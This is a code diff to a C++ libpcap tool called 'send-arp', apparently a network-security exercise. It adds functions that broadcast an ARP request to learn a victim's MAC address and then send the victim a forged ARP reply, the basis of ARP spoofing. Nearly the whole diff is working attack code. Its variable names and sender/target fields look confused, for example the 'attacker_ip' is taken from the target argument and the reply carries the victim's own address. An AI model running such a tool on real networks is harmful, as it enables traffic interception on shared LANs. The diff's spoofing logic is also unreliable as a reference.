@@ -18,7 +18,7 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
-std::string target_mac(const char *interface) {
+std::string get_attacker_mac(const char *interface) {
     struct ifreq ifr;
     unsigned char *macAddress;
     std::string result;
@@ -46,6 +46,68 @@ std::string target_mac(const char *interface) {
     return macStr;
 }
 
+std::string arp_request(char* victim_ip, char* attacker_ip, std::string attacker_mac, pcap_t* handle) {
+    EthArpPacket packet;
+    //request => sender = attacker, target = victim
+    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // Broadcast MAC address
+    packet.eth_.smac_ = Mac(attacker_mac.c_str()); // Attacker's MAC address
+    packet.eth_.type_ = htons(EthHdr::Arp);
+    
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
+    packet.arp_.op_ = htons(ArpHdr::Request);
+    packet.arp_.smac_ = Mac(attacker_mac.c_str()); // Sender's MAC address
+    packet.arp_.sip_ = htonl(Ip(attacker_ip)); // Sender's IP address
+    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Victim's MAC address (Unknown)
+    packet.arp_.tip_ = htonl(Ip(victim_ip)); // Target's IP address (Supplied as argument)
+    
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res != 0) 
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* recv_packet;
+        
+        int res = pcap_next_ex(handle, &header, &recv_packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
+        
+        memcpy(&packet, recv_packet, sizeof(EthArpPacket));
+        if (packet.eth_.type_ != htons(EthHdr::Arp)) continue;
+        if ((uint32_t)packet.arp_.sip_ == htonl(Ip(victim_ip))) {
+            //printf("Victim MAC = %s\n", std::string(packet.arp_.smac_).c_str());
+            break;
+        }
+    }
+    
+    return std::string(packet.arp_.smac_);
+}
+
+void arp_reply(char* victim_ip, char* attacker_ip, std::string victim_mac, std::string attacker_mac, pcap_t* handle) {
+    EthArpPacket packet;
+    //reply => sender = victim, target = attacker
+    packet.eth_.dmac_ = Mac(victim_mac.c_str());
+    packet.eth_.smac_ = Mac(attacker_mac.c_str()); // Attacker's MAC address
+    packet.eth_.type_ = htons(EthHdr::Arp);
+    
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
+    packet.arp_.op_ = htons(ArpHdr::Reply);
+    packet.arp_.smac_ = Mac(victim_mac.c_str()); // Sender's MAC address
+    packet.arp_.sip_ = htonl(Ip(victim_ip)); // Sender's IP address
+    packet.arp_.tmac_ = Mac(attacker_mac.c_str()); // Victim's MAC address
+    packet.arp_.tip_ = htonl(Ip(attacker_ip)); // Target's IP address (Supplied as argument)
+    
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res != 0) 
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+}
+
 void usage() {
     printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
     printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
@@ -59,37 +121,22 @@ int main(int argc, char* argv[]) {
     
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
+    pcap_t* handle = pcap_open_live(dev, 0, 1, 1, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return -1;
     }
     
     const char *interface = argv[1];
-    std::string macAddress = target_mac(interface);
+    std::string attacker_mac = get_attacker_mac(interface);
     
-    printf("target mac = %s\n", macAddress.c_str());
+    printf("Attacker MAC = %s\n", attacker_mac.c_str());
     
-    EthArpPacket packet;
+    std::string victim_mac = arp_request(argv[2], argv[3], attacker_mac, handle);
+    printf("Victim MAC = %s\n", victim_mac.c_str());
     
-    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // Broadcast MAC address
-    packet.eth_.smac_ = Mac("00:00:00:00:00:00"); // Sender's MAC address
-    packet.eth_.type_ = htons(EthHdr::Arp);
-    
-    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-    packet.arp_.pro_ = htons(EthHdr::Ip4);
-    packet.arp_.hln_ = Mac::SIZE;
-    packet.arp_.pln_ = Ip::SIZE;
-    packet.arp_.op_ = htons(ArpHdr::Request);
-    packet.arp_.smac_ = Mac("00:00:00:00:00:00"); // Sender's MAC address
-    packet.arp_.sip_ = htonl(Ip(argv[2])); // Sender's IP address
-    packet.arp_.tmac_ = Mac(macAddress.c_str()); // Target's MAC address (Unknown)
-    packet.arp_.tip_ = htonl(Ip(argv[3])); // Target's IP address (Supplied as argument)
-    
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    if (res != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-    }
+    arp_reply(argv[2], argv[3], victim_mac, attacker_mac, handle);
     
     pcap_close(handle);
+    printf("done");
 }
